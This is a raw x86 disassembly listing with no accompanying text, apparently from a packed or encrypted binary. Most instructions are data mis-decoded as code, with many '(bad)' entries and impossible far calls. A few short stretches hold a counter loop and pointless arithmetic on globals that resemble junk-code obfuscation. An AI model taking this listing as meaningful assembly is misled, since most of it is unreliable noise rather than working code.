  40628d:	pop    ebx
  40628e:	push   edx
  40628f:	outs   dx,BYTE PTR ds:[esi]
  406290:	inc    edi
  406291:	sub    eax,0x6e20d6cf
  406296:	mov    bh,0xb1
  406298:	cmp    BYTE PTR [eax-0x2afea8a],0x6f
  40629f:	sub    BYTE PTR [ebp-0x31],dl
  4062a2:	cmp    eax,DWORD PTR [ebp+0x41]
  4062a5:	and    eax,0x37547f47
  4062aa:	mov    WORD PTR [edx+eax*4-0x1ce3fde9],cs
  4062b1:	popf   
  4062b2:	or     BYTE PTR [esi+0x35c07be7],cl
  4062b8:	inc    edi
  4062b9:	xor    BYTE PTR [edx-0x53],0xa6
  4062bd:	in     eax,0x24
  4062bf:	dec    esi
  4062c0:	call   FWORD PTR [ecx+ecx*2]
  4062c3:	ret    0xf640
  4062c6:	jp     0x40631f
  4062c8:	ret    0x2ef7
  4062cb:	add    al,0x7a
  4062cd:	scas   al,BYTE PTR es:[edi]
  4062ce:	cmp    eax,0x42dad2d1
  4062d3:	dec    edx
  4062d4:	test   BYTE PTR [ebp+0x735749a8],bl
  4062da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062db:	stc    
  4062dc:	data16 jo 0x40632a
  4062df:	cmp    BYTE PTR [edx+edi*8],dl
  4062e2:	outs   dx,DWORD PTR ds:[esi]
  4062e3:	jecxz  0x406270
  4062e5:	mov    ecx,0x601ec957
  4062ea:	jg     0x40635e
  4062ec:	and    esp,DWORD PTR [eax]
  4062ee:	dec    BYTE PTR [edi-0x7f]
  4062f1:	rcl    BYTE PTR [edi-0x918a209],1
  4062f7:	inc    esp
  4062f8:	hlt    
  4062f9:	stc    
  4062fa:	(bad)  
  4062fb:	or     BYTE PTR gs:[edx-0x36],bl
  4062ff:	rcr    ch,cl
  406301:	scas   eax,DWORD PTR es:[edi]
  406302:	jnp    0x40629c
  406304:	or     BYTE PTR [ecx+0x5d],cl
  406307:	mov    cl,0x7b
  406309:	mov    edi,cs
  40630b:	sub    dh,BYTE PTR [ebp+esi*8-0xb793e3c]
  406312:	repz stc 
  406314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406315:	daa    
  406316:	push   0x2c8d62b1
  40631b:	dec    dx
  40631d:	push   ebp
  40631e:	mov    ebx,0x62938ecb
  406323:	or     BYTE PTR [ebx+0xa4a700],bl
  406329:	sub    eax,0xe67e2dd0
  40632e:	push   0xb53f2b09
  406333:	inc    ebp
  406334:	scas   al,BYTE PTR es:[edi]
  406335:	sub    eax,DWORD PTR [ecx+0x34]
  406338:	dec    DWORD PTR [edi]
  40633a:	dec    esi
  40633b:	retf   0xd901
  40633e:	pop    ebp
  40633f:	inc    edx
  406340:	les    esp,FWORD PTR ds:0xb5bbf8fc
  406346:	cmp    DWORD PTR [edi-0x6e],ecx
  406349:	icebp  
  40634a:	push   esp
  40634b:	push   0x15bacd6f
  406350:	fcomi  st,st(2)
  406352:	and    ecx,DWORD PTR [eax]
  406354:	loopne 0x4063b7
  406356:	or     ah,dl
  406358:	adc    eax,DWORD PTR [edi+0xcc2227f]
  40635e:	scas   eax,DWORD PTR es:[edi]
  40635f:	xchg   esp,eax
  406360:	mov    ah,dh
  406362:	mov    bl,0x40
  406364:	lock push ebx
  406366:	xchg   ebp,eax
  406367:	push   ds
  406368:	cld    
  406369:	fs mov ch,0x80
  40636c:	add    bl,cl
  40636e:	aaa    
  40636f:	neg    BYTE PTR [esi]
  406371:	jbe    0x4063c0
  406373:	inc    esp
  406374:	jo     0x4063df
  406376:	lods   eax,DWORD PTR ds:[esi]
  406377:	jl     0x406363
  406379:	arpl   WORD PTR [edx-0x2a],di
  40637c:	adc    DWORD PTR [ebp+edx*4-0x6b],eax
  406380:	jb     0x4063f9
  406382:	jno    0x406373
  406384:	call   0xd2492e89
  406389:	pop    esp
  40638a:	push   ds
  40638b:	int    0x52
  40638d:	push   es
  40638e:	popf   
  40638f:	(bad)  
  406390:	mov    al,ds:0xb9c05344
  406395:	jmp    0x70d5df01
  40639a:	jmp    0x4063ec
  40639c:	cld    
  40639d:	add    ecx,DWORD PTR [eax+0x71d1ac63]
  4063a3:	psubd  mm2,QWORD PTR [edi+0xcded38d]
  4063aa:	std    
  4063ab:	jae    0x406393
  4063ad:	add    DWORD PTR [ebp-0xc86b327],0x2b42f2b8
  4063b7:	jge    0x40640f
  4063b9:	std    
  4063ba:	es mov dh,0xd1
  4063bd:	sti    
  4063be:	mov    eax,ds:0xb4e5ed2e
  4063c3:	add    DWORD PTR [eax-0x1979ff48],esi
  4063c9:	and    BYTE PTR [edi+0x61f43a7f],dl
  4063cf:	or     al,0x84
  4063d1:	popa   
  4063d2:	mov    edx,0x32d35af3
  4063d7:	ret    
  4063d8:	jbe    0x40640f
  4063da:	mov    al,ds:0x85e15757
  4063df:	cmp    bh,BYTE PTR [esi-0x5d]
  4063e2:	xchg   edi,eax
  4063e3:	mov    ah,0x85
  4063e5:	repz imul esi,DWORD PTR [edx+ebx*4+0x308ed344],0x35
  4063ee:	cli    
  4063ef:	repz sbb al,BYTE PTR ss:[ecx+0x549cbd1d]
  4063f7:	ins    BYTE PTR es:[edi],dx
  4063f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f9:	xchg   BYTE PTR [edi-0x713203ae],cl
  4063ff:	jl     0x4063ab
  406401:	pushf  
  406402:	fisttp WORD PTR [eax]
  406404:	cdq    
  406405:	push   es
  406406:	(bad)  
  406407:	pop    ebp
  406408:	push   esp
  406409:	push   edx
  40640a:	jo     0x4063c8
  40640c:	push   ecx
  40640d:	aaa    
  40640e:	jno    0x4063c7
  406410:	shl    DWORD PTR [esi],0x99
  406413:	sub    eax,0x44af7c98
  406418:	out    dx,eax
  406419:	sbb    ecx,ebx
  40641b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40641c:	ins    DWORD PTR es:[edi],dx
  40641d:	cmp    ecx,DWORD PTR [edx]
  40641f:	std    
  406420:	call   0x8f8386da
  406425:	jb     0x4063cb
  406427:	mov    esi,0xb2da4e7e
  40642c:	xchg   edi,eax
  40642d:	dec    eax
  40642e:	mov    ecx,ds
  406430:	test   dh,bh
  406432:	pop    eax
  406433:	sub    dh,ah
  406435:	(bad)  
  406436:	and    BYTE PTR [ebx+0x7c0ee5ff],cl
  40643c:	sub    al,BYTE PTR [esi-0x6bcc156a]
  406442:	sahf   
  406443:	int3   
  406444:	rcr    DWORD PTR [esi],1
  406446:	inc    eax
  406447:	in     eax,0x7d
  406449:	test   al,0x4
  40644b:	push   esi
  40644c:	fcom   QWORD PTR [ecx+eax*2]
  40644f:	mov    ss,WORD PTR [edi+0x61295452]
  406455:	pusha  
  406456:	cmp    ebp,DWORD PTR [ebx-0x90ddbc3]
  40645c:	jl     0x406439
  40645e:	dec    esi
  40645f:	mov    bh,0x72
  406461:	jg     0x40647d
  406463:	or     al,0x58
  406465:	inc    ecx
  406466:	jge    0x40642f
  406468:	push   ds
  406469:	sbb    ch,BYTE PTR [edi+0x40794440]
  40646f:	jne    0x4064a1
  406471:	sub    eax,0xb5b706d0
  406476:	mov    al,0x96
  406478:	add    eax,0x2b378b14
  40647d:	cli    
  40647e:	cmp    eax,ecx
  406480:	cmc    
  406481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406482:	and    eax,0x9a2f9315
  406487:	and    eax,0x39e8bca3
  40648c:	jecxz  0x40644d
  40648e:	cld    
  40648f:	jle    0x4064b5
  406491:	lds    ebx,FWORD PTR [edx-0x146eea70]
  406497:	xchg   ch,dl
  406499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40649a:	add    cl,BYTE PTR [edx]
  40649c:	pop    ebp
  40649d:	mov    dh,BYTE PTR [esi-0x1d]
  4064a0:	loopne 0x4064b5
  4064a2:	jle    0x4064fa
  4064a4:	sub    ecx,DWORD PTR [ebp-0x75feb71f]
  4064aa:	(bad)  
  4064ab:	mov    edi,0x3e0bb0ed
  4064b0:	jle    0x4064a7
  4064b2:	xor    edi,0xffffff92
  4064b5:	xor    al,0xa5
  4064b7:	popa   
  4064b8:	push   edi
  4064b9:	xchg   ecx,eax
  4064ba:	rcr    DWORD PTR [edi-0x38ea5c41],1
  4064c0:	and    ecx,DWORD PTR [eax-0x78]
  4064c3:	inc    ebp
  4064c4:	ror    DWORD PTR [ebp+0x29],1
  4064c7:	mov    esp,ecx
  4064c9:	jbe    0x406451
  4064cb:	dec    ebp
  4064cc:	out    dx,al
  4064cd:	push   ebx
  4064ce:	out    0xe,al
  4064d0:	dec    ecx
  4064d1:	shl    BYTE PTR [ecx-0x5e],0xf4
  4064d5:	js     0x4064f1
  4064d7:	adc    edx,ebp
  4064d9:	jmp    0x8ffc:0x90c49072
  4064e0:	mov    al,0xe6
  4064e2:	mov    cl,0xb
  4064e4:	or     BYTE PTR [ebx+eiz*2-0x17bc0615],bh
  4064eb:	jo     0x406517
  4064ed:	(bad)  
  4064ee:	in     al,dx
  4064ef:	(bad)  
  4064f0:	jge    0x40649b
  4064f2:	pop    ebx
  4064f3:	(bad)  
  4064f4:	xor    dh,BYTE PTR [ebp-0x307d4815]
  4064fa:	fs lock push es
  4064fd:	and    al,0x6c
  4064ff:	mov    edx,DWORD PTR [edx]
  406501:	loopne 0x406538
  406503:	xchg   ecx,eax
  406504:	dec    esi
  406505:	test   esi,0xc2809626
  40650b:	push   ebx
  40650c:	mov    eax,0xbc92d7c7
  406511:	push   0x803d8221
  406516:	jbe    0x406589
  406518:	or     eax,0xfeba3aca
  40651d:	stos   DWORD PTR es:[edi],eax
  40651e:	push   esp
  40651f:	fistp  WORD PTR [edx-0x3e]
  406522:	pop    esp
  406523:	sbb    DWORD PTR [esi+0x42f29b0c],ecx
  406529:	xchg   ebp,eax
  40652a:	xor    dl,bh
  40652c:	lods   eax,DWORD PTR ds:[esi]
  40652d:	into   
  40652e:	sbb    dh,BYTE PTR [edx-0x7f]
  406531:	dec    esi
  406532:	add    cl,ah
  406534:	fild   QWORD PTR [ebx+ebp*8-0x15cbca85]
  40653c:	inc    DWORD PTR [eax+0x6de418a8]
  406542:	stc    
  406543:	jp     0x406553
  406545:	fwait
  406546:	ins    DWORD PTR es:[edi],dx
  406547:	add    edi,DWORD PTR [ebp+0x71]
  40654a:	jecxz  0x4064cd
  40654c:	mov    edi,?
  40654e:	pop    es
  40654f:	ins    BYTE PTR es:[edi],dx
  406550:	pop    edi
  406551:	mov    BYTE PTR [esi-0x702e2ac2],cl
  406557:	stos   DWORD PTR es:[edi],eax
  406558:	xchg   ebp,eax
  406559:	fsubr  DWORD PTR [ecx-0x32]
  40655c:	pop    ss
  40655d:	inc    ebp
  40655e:	and    al,0x92
  406560:	popf   
  406561:	sahf   
  406562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406563:	imul   eax,DWORD PTR [edi],0xffffff96
  406566:	repz cmp al,0x65
  406569:	xchg   edx,eax
  40656a:	mov    dl,0x2f
  40656c:	or     al,0x70
  40656e:	adc    bh,BYTE PTR [edi+0x70]
  406571:	div    BYTE PTR [edx+0x2a131b5c]
  406577:	mov    edx,0xfad968b2
  40657c:	inc    edx
  40657d:	inc    ebx
  40657e:	popa   
  40657f:	es inc ebx
  406581:	out    dx,eax
  406582:	xchg   ecx,eax
  406583:	test   al,0x5f
  406585:	(bad)  
  406586:	dec    edx
  406587:	ja     0x406557
  406589:	push   ecx
  40658a:	pop    ebp
  40658b:	jbe    0x406558
  40658d:	xor    bh,bl
  40658f:	(bad)  
  406590:	push   0xfe6a4d01
  406595:	(bad)  
  406596:	dec    eax
  406597:	dec    edi
  406598:	jb     0x406551
  40659a:	outs   dx,BYTE PTR ds:[esi]
  40659b:	jo     0x4065c2
  40659d:	int3   
  40659e:	fisttp WORD PTR [eax]
  4065a0:	scas   al,BYTE PTR es:[edi]
  4065a1:	fimul  WORD PTR [ebp-0x48f023bb]
  4065a7:	or     eax,0x43473b
  4065ac:	and    ecx,DWORD PTR ds:0x434673
  4065b2:	mov    DWORD PTR ds:0x43473b,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x43467f,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43478f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x434677,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x4346cf,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x43466b,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x43466b
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x43466b,ecx
  4065fa:	cmp    DWORD PTR ds:0x43466b,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x4346c7
  40660f:	push   0x43499f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x43466b,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	add    DWORD PTR [eax],0x32
  40663b:	jb     0x406689
  40663d:	cmp    edi,DWORD PTR [esi+0x7e]
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x4065d0
  406645:	mov    ds:0xef4ab552,eax
  40664a:	int3   
  40664b:	jne    0x4065e6
  40664d:	enter  0x6180,0x94
  406651:	out    dx,al
  406652:	mov    esp,0xf0b140a6
  406657:	jmp    0x7ca36886
  40665c:	jnp    0x406624
  40665e:	in     eax,0xe6
  406660:	jne    0x4065ec
  406662:	fadd   QWORD PTR [esi+0x4595c9b9]
  406668:	inc    eax
  406669:	cmp    DWORD PTR [edi+eax*4],edx
  40666c:	test   al,0xb3
  40666e:	fwait
  40666f:	stos   BYTE PTR es:[edi],al
  406670:	dec    BYTE PTR ds:0x246ca436
  406676:	mov    al,0x10
  406678:	std    
  406679:	shl    BYTE PTR [ebx],cl
  40667b:	add    dl,ch
  40667d:	push   si
  40667f:	push   ds
  406680:	retf   0xf990
  406683:	pop    eax
  406684:	inc    dl
  406686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406687:	push   0x41adc01d
  40668c:	das    
  40668d:	mov    bh,0xf
  40668f:	jle    0x406686
  406691:	dec    edx
  406692:	lods   eax,DWORD PTR ds:[esi]
  406693:	xchg   DWORD PTR [edx-0x3d],edx
  406696:	pop    ebp
  406697:	and    eax,0x245bbda1
  40669c:	loope  0x406627
  40669e:	adc    ch,BYTE PTR [ebp-0x714eb147]
  4066a4:	mov    edx,0xf366ea7c
  4066a9:	or     ebx,DWORD PTR [esp+ebp*2]
  4066ac:	sub    eax,0xfa71b9cf
  4066b1:	out    0x8a,al
  4066b3:	(bad)  
  4066b4:	mov    dl,0x34
  4066b6:	fdivr  DWORD PTR [ebx+0x5b]
  4066b9:	mov    ?,edi
  4066bb:	xchg   DWORD PTR [edi-0x3f],ecx
  4066be:	push   0xfffffff4
  4066c0:	jo     0x406675
  4066c2:	pop    ss
  4066c3:	popa   
  4066c4:	daa    
  4066c5:	add    al,0x15
  4066c7:	or     cl,BYTE PTR [edi]
  4066c9:	lea    esp,[ebp-0x3eaf25c1]
  4066cf:	cmp    DWORD PTR [ebx+0x75],0x2983cec2
  4066d6:	adc    esp,ebx
  4066d8:	(bad)  
  4066d9:	retf   0x1669
  4066dc:	push   edx
  4066dd:	sub    ebp,DWORD PTR [ebp+0x64]
  4066e0:	(bad)  
  4066e1:	stos   DWORD PTR es:[edi],eax
  4066e2:	fisttp WORD PTR [eax-0x3a2073bd]
  4066e8:	push   edx
  4066e9:	test   eax,0x85ed9393
  4066ee:	add    al,0x23
  4066f0:	pop    edi
  4066f1:	icebp  
  4066f2:	jnp    0x406747
  4066f4:	jae    0x40668f
  4066f6:	dec    ebx
  4066f7:	dec    ebx
  4066f8:	fadd   DWORD PTR [ebx-0x428e9a22]
  4066fe:	pop    ss
  4066ff:	adc    DWORD PTR [ecx-0x7c],ebx
  406702:	inc    edi
  406703:	scas   eax,DWORD PTR es:[edi]
  406704:	cmp    BYTE PTR [ebx*8+0x303111f],dl
  40670b:	in     eax,dx
  40670c:	jg     0x4066c3
  40670e:	pop    ebx
  40670f:	adc    eax,0x86f48364
  406714:	icebp  
  406715:	and    DWORD PTR [esi+edi*4-0x7c],edi
  406719:	push   esp
  40671a:	push   ss
  40671b:	add    dl,BYTE PTR [ebp+0x1b]
  40671e:	mov    al,es:0x9ac0beb3
  406724:	pushf  
  406725:	sbb    eax,0xcdb11820
  40672a:	dec    ebp
  40672b:	mov    bl,0xda
  40672d:	xor    ch,al
  40672f:	push   ebx
  406730:	mov    esi,0xb573157f
  406735:	dec    esi
  406736:	das    
  406737:	jno    0x4067ab
  406739:	shl    DWORD PTR [ebp+0x3afc01ae],1
  40673f:	push   eax
  406740:	(bad)  
  406741:	clc    
  406742:	adc    dl,BYTE PTR [edi]
  406744:	in     eax,0xc2
  406746:	push   esp
  406747:	cld    
  406748:	mov    ah,0x6a
  40674a:	xchg   esi,eax
  40674b:	inc    edx
  40674c:	dec    edi
  40674d:	pop    ss
  40674e:	jbe    0x406739
  406750:	xchg   ecx,eax
  406751:	jmp    0x406774
  406753:	inc    esp
  406754:	sbb    al,0xab
  406756:	call   0xad6fe02d
  40675b:	cwde   
  40675c:	and    al,0x5f
  40675e:	test   BYTE PTR [ebx],bh
  406760:	int    0xa0
  406762:	jb     0x406761
  406764:	inc    edx
  406765:	inc    ebp
  406766:	sbb    BYTE PTR [edi-0x5c],cl
  406769:	test   al,0x53
  40676b:	call   0x88f33608
  406770:	fwait
  406771:	push   es
  406772:	stos   BYTE PTR es:[edi],al
  406773:	mov    ds:0x219f0464,eax
  406778:	add    al,0xa2
  40677a:	scas   al,BYTE PTR es:[edi]
  40677b:	not    BYTE PTR [ebp-0x8]
  40677e:	pop    ds
  40677f:	shr    BYTE PTR gs:[edi-0x5e],1
  406783:	stos   DWORD PTR es:[edi],eax
  406784:	cmp    ch,BYTE PTR [esp+edi*2]
  406787:	data16 (bad) 
  406789:	cld    
  40678a:	dec    esi
  40678b:	std    
  40678c:	dec    ebx
  40678d:	mov    DWORD PTR [edi+0x175bbfb3],edi
  406793:	push   0x6d646fa8
  406798:	dec    edi
  406799:	cmp    BYTE PTR [ebp+0x23b87cd8],dl
  40679f:	ror    DWORD PTR [edx+0x30],cl
  4067a2:	out    dx,eax
  4067a3:	mov    eax,ds:0x8560c443
  4067a8:	mov    dh,0x16
  4067aa:	push   eax
  4067ab:	mov    ecx,DWORD PTR [edx+0x2eb8f35d]
  4067b1:	les    ebx,FWORD PTR [eax+eiz*2+0x69]
  4067b5:	mov    eax,0x69f3b152
  4067ba:	call   0xbde4:0x34d4db63
  4067c1:	arpl   sp,cx
  4067c3:	adc    DWORD PTR [esi+ebp*4-0x43199bc2],edi
  4067ca:	int    0x62
  4067cc:	push   esi
  4067cd:	out    0x74,eax
  4067cf:	xchg   ecx,eax
  4067d0:	add    cl,BYTE PTR [edx]
  4067d2:	xor    edx,DWORD PTR [esi]
  4067d4:	and    eax,DWORD PTR [eax+edi*1-0x4a]
  4067d8:	daa    
  4067d9:	shr    DWORD PTR [esi],1
  4067db:	pop    esi
  4067dc:	mov    eax,0x89da230e
  4067e1:	int    0xde
  4067e3:	shr    BYTE PTR [ecx+edi*8],1
  4067e6:	in     al,dx
  4067e7:	adc    al,0x80
  4067e9:	fidivr DWORD PTR [edx+0x39f716f4]
  4067ef:	outs   dx,BYTE PTR ds:[esi]
  4067f0:	push   eax
  4067f1:	ss pop es
  4067f3:	inc    esp
  4067f4:	sbb    DWORD PTR [ebp+ebp*1+0x69],esi
  4067f8:	outs   dx,DWORD PTR ds:[esi]
  4067f9:	lock xor esi,esp
  4067fc:	sub    al,0x0
  4067fe:	rcr    BYTE PTR [edi],1
  406800:	addr16 aas 
  406802:	fistp  DWORD PTR [edi-0x6f]
  406805:	mov    BYTE PTR [esi-0x60c14cec],ch
  40680b:	stos   BYTE PTR es:[edi],al
  40680c:	call   0x4cd2:0x9699b111
  406813:	ins    BYTE PTR es:[edi],dx
  406814:	test   BYTE PTR [ebx-0xb3dd157],cl
  40681a:	push   ebx
  40681b:	sub    al,BYTE PTR [esi]
  40681d:	xchg   ebp,eax
  40681e:	fstp   st(5)
  406820:	jo     0x4067fc
  406822:	pop    esp
  406823:	sbb    edi,DWORD PTR [ebx]
  406825:	pop    ebx
  406826:	sub    eax,0x807c7ed0
  40682b:	ds jp  0x4067bd
  40682e:	test   eax,0xba85221a
  406833:	iret   
  406834:	es pop ebp
  406836:	das    
  406837:	push   es
  406838:	loop   0x406820
  40683a:	push   esp
  40683b:	std    
  40683c:	or     al,0x6a
  40683e:	jb     0x406852
  406840:	(bad)  
  406841:	fmul   st,st(1)
  406843:	adc    BYTE PTR [edx-0x661b7bf7],cl
  406849:	cmp    eax,0x2fa54a97
  40684e:	sub    al,cl
  406850:	dec    ebx
  406851:	into   
  406852:	sbb    eax,0x77f0f64f
  406857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406858:	add    DWORD PTR [ebx],ebp
  40685a:	rcr    DWORD PTR [eax-0x2b],cl
  40685d:	mov    al,ds:0xcbc10b99
  406862:	cmp    al,0x9e
  406864:	repnz loop 0x4068ce
  406867:	lods   al,BYTE PTR ds:[esi]
  406868:	xchg   ebx,eax
  406869:	ja     0x40688a
  40686b:	fld    QWORD PTR [eax+ebx*8+0x11d7a97a]
  406872:	int3   
  406873:	jae    0x406856
  406875:	loop   0x40689a
  406877:	in     eax,0xad
  406879:	sbb    eax,0xc9e7985
  40687e:	pop    esp
  40687f:	fdivrp st(4),st
  406881:	xor    al,0xdb
  406883:	push   ecx
  406884:	(bad)  
  406886:	mov    DWORD PTR [ebp+0x7b],esi
  406889:	and    ch,BYTE PTR ds:0xf197d32a
  40688f:	call   0xd5d3ddb9
  406894:	(bad)  
  406896:	rcr    ah,0xf1
  406899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40689a:	or     al,0xaf
  40689c:	xchg   DWORD PTR [edi+0x645e267f],esp
  4068a2:	mov    edi,0x9a1de87b
  4068a7:	rcl    BYTE PTR ds:0xa1c2be14,1
  4068ad:	(bad)  
  4068af:	jle    0x406867
  4068b1:	hlt    
  4068b2:	mov    al,BYTE PTR [esi+0x4a1db181]
  4068b8:	pop    ds
  4068b9:	nop
  4068ba:	repnz outs dx,BYTE PTR ds:[esi]
  4068bc:	fs fwait
  4068be:	ja     0x40690c
  4068c0:	inc    ebp
  4068c1:	cmp    eax,DWORD PTR [ebx+0x4d]
  4068c4:	mov    edx,0x92875b88
  4068c9:	sbb    ch,BYTE PTR [esi]
  4068cb:	xchg   edi,eax
  4068cc:	cmc    
  4068cd:	xor    BYTE PTR [edi-0x24b9c802],bh
  4068d3:	pop    es
  4068d4:	repz adc ebp,eax
  4068d7:	sub    ch,0x49
  4068da:	sbb    BYTE PTR [edx+0x60b5d501],ah
  4068e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e1:	adc    eax,0x5063ef3e
  4068e6:	std    
  4068e7:	sahf   
  4068e8:	xlat   BYTE PTR ds:[ebx]
  4068e9:	mov    al,0x12
  4068eb:	and    ecx,DWORD PTR [ebx]
  4068ed:	lock xchg esi,eax
  4068ef:	fsubr  QWORD PTR [edx-0x58]
  4068f2:	jns    0x4068fc
  4068f4:	adc    DWORD PTR [ebx-0x2f],eax
  4068f7:	cmp    eax,0x721ce942
  4068fc:	mov    WORD PTR [ecx-0x31],fs
  4068ff:	xor    al,0x8c
  406901:	cmc    
  406902:	add    dh,BYTE PTR [eax+0x25fe46c]
  406908:	push   ecx
  406909:	push   ss
  40690a:	sar    BYTE PTR [eax+0x3d],1
  40690d:	cld    
  40690e:	push   ebp
  40690f:	shl    DWORD PTR [edx+0x60],1
  406912:	jl     0x40689c
  406914:	fcom   QWORD PTR [eax+0x28]
  406917:	mov    ds:0xb52b52a0,eax
  40691c:	ja     0x40695a
  40691e:	mov    bl,0x3
  406920:	std    
  406921:	xchg   DWORD PTR [esi+ebp*8+0x375fb945],ebx
  406928:	je     0x40694f
  40692a:	jmp    0x40690b
  40692c:	fimul  WORD PTR gs:[edi-0x53a35622]
  406933:	repnz xchg edx,eax
  406935:	(bad)  
  406936:	lds    ebx,FWORD PTR [esi-0x204d17b3]
  40693c:	aaa    
  40693d:	mulps  xmm5,XMMWORD PTR [ebx+0x3273bafa]
  406944:	lods   eax,DWORD PTR ds:[esi]
  406945:	jbe    0x406981
  406947:	inc    ecx
  406948:	xchg   edi,eax
  406949:	mov    al,0xd9
  40694b:	frstor [edx]
  40694d:	push   es
  40694e:	jp     0x4069bb
  406950:	out    0x43,al
  406952:	jl     0x40697f
  406954:	or     BYTE PTR [esp+ecx*1],bh
  406957:	pop    eax
  406958:	in     al,dx
  406959:	push   0x3e
  40695b:	popf   
  40695c:	shl    DWORD PTR [edi+edx*1],1
  40695f:	icebp  
  406960:	ror    DWORD PTR [ecx-0x564da437],0x3b
  406967:	test   eax,0x438bff1e
  40696c:	or     al,0x29
  40696e:	in     al,0x1c
  406970:	sub    DWORD PTR ds:0xe9ed234a,edi
  406976:	mov    esi,0xb41cd03c
  40697b:	outs   dx,BYTE PTR ds:[esi]
  40697c:	pop    edi
  40697d:	aad    0x8f
  40697f:	dec    eax
  406980:	push   eax
  406982:	enter  0xd9c8,0x1
  406986:	out    0xc1,al
  406988:	paddsw mm2,QWORD PTR ds:0xbab052ed
  40698f:	popf   
  406990:	gs mov edi,0x723d8402
  406996:	dec    esp
  406997:	xchg   ebx,eax
  406998:	ror    DWORD PTR [eax],0x3a
  40699b:	push   ebx
  40699c:	outs   dx,DWORD PTR ds:[esi]
  40699d:	into   
  40699e:	aad    0x9d
  4069a0:	cmc    
  4069a1:	popa   
  4069a2:	xlat   BYTE PTR ds:[ebx]
  4069a3:	pop    edx
  4069a4:	add    al,BYTE PTR [ecx-0x39]
  4069a7:	push   ds
  4069a8:	rol    BYTE PTR [edi-0x7e],0x67
  4069ac:	jge    0x406936
  4069ae:	dec    esp
  4069af:	cmp    ebx,DWORD PTR [ebx+eiz*4]
  4069b2:	and    al,0xdb
  4069b4:	das    
  4069b5:	sbb    eax,0x9875ff24
  4069ba:	out    dx,al
  4069bb:	mov    eax,0x83679427
  4069c0:	call   0xcde6:0x31ac71c4
  4069c7:	push   eax
  4069c8:	sub    edx,DWORD PTR [esi]
  4069ca:	(bad)  
  4069cc:	xor    al,0x64
  4069ce:	or     BYTE PTR [ebx+edi*2-0x3c],dl
  4069d2:	ins    BYTE PTR es:[edi],dx
  4069d3:	adc    eax,0xa8b6bad1
  4069d8:	inc    edi
  4069d9:	not    DWORD PTR [ebx-0x4ddf2046]
  4069df:	or     al,ch
  4069e1:	stos   BYTE PTR es:[edi],al
  4069e2:	sti    
  4069e3:	out    0xac,eax
  4069e5:	or     BYTE PTR [edx-0x36f279a1],cl
  4069eb:	xor    ah,dh
  4069ed:	cmp    eax,0x383e371e
  4069f2:	push   ss
  4069f3:	retf   
  4069f4:	jo     0x406a0a
  4069f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069f7:	gs jo  0x406a24
  4069fa:	adc    eax,0xd719ac39
  4069ff:	mov    BYTE PTR [esi-0x15744d20],ah
  406a05:	mov    esp,0xbe008183
  406a0a:	mov    ebp,0x77fdb7b4
  406a0f:	ins    BYTE PTR es:[edi],dx
  406a10:	fs add al,0xec
  406a13:	popa   
  406a14:	adc    edx,DWORD PTR [esi+0x57]
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434703,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x43467b
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x4346bb,0x434777
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x43465f,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x4346b7,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x54d263eb,eax
  406a76:	repz popf 
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406aff
  406a80:	pop    ebp
  406a81:	fcmovnbe st,st(7)
  406a83:	fsub   st(4),st
  406a85:	mov    ah,0xa7
  406a87:	sub    DWORD PTR [ecx+0x12],edi
  406a8a:	sbb    esi,edx
  406a8c:	je     0x406a2d
  406a8e:	dec    ecx
  406a8f:	push   edx
  406a90:	retf   
  406a91:	xor    eax,0x4248f7e4
  406a96:	xor    BYTE PTR [ecx],ch
  406a98:	add    eax,0xe4287f87
  406a9d:	push   ebx
  406a9e:	mov    edx,0xa31d413f
  406aa3:	(bad)  
  406aa4:	sbb    DWORD PTR [eax+0x58e57d99],0x50301e6
